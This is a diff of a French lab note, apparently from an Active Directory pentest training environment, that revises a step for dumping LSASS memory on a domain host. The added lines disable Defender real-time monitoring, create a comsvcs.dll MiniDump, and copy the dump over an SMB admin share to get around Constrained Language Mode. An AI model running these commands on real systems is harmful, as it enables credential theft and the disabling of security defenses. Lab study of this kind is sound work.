@@ -26,15 +26,19 @@ klist
 # doit lister un TGT krbtgt/DOLLARCORP pour svcadmin
 ```
 
-### Étape 2 : dump LSASS de dcorp-adminsrv (via PSSession DA)
+### Étape 2 : dump LSASS de dcorp-adminsrv (via PSSession CLM-safe)
 ```powershell
 $s = New-PSSession -ComputerName dcorp-adminsrv
 Invoke-Command -Session $s -ScriptBlock {
-  $p = (Get-Process lsass).Id
+  Set-MpPreference -DisableRealtimeMonitoring $true                                # cmdlet, CLM OK
+  $p = (Get-Process lsass).Id                                                       # property access, CLM OK
   cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Users\Public\lsass.dmp full"
+  (Get-Item C:\Users\Public\lsass.dmp).Length                                       # note la taille
 }
-Copy-Item -FromSession $s C:\Users\Public\lsass.dmp -Destination C:\AD\Tools\lsass-adminsrv.dmp
+# ATTENTION : Copy-Item -FromSession bloqué en CLM. Utilise SMB UNC direct :
+Copy-Item -Path "\\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\Users\Public\lsass.dmp" -Destination C:\AD\Tools\lsass-adminsrv.dmp
 Remove-PSSession $s
+(Get-Item C:\AD\Tools\lsass-adminsrv.dmp).Length                                    # doit MATCHER la source
 ```
 → Voir [[Cheatsheet - Post-exploitation]] pour la variante `SafetyKatz` directe et la logique dump.
 
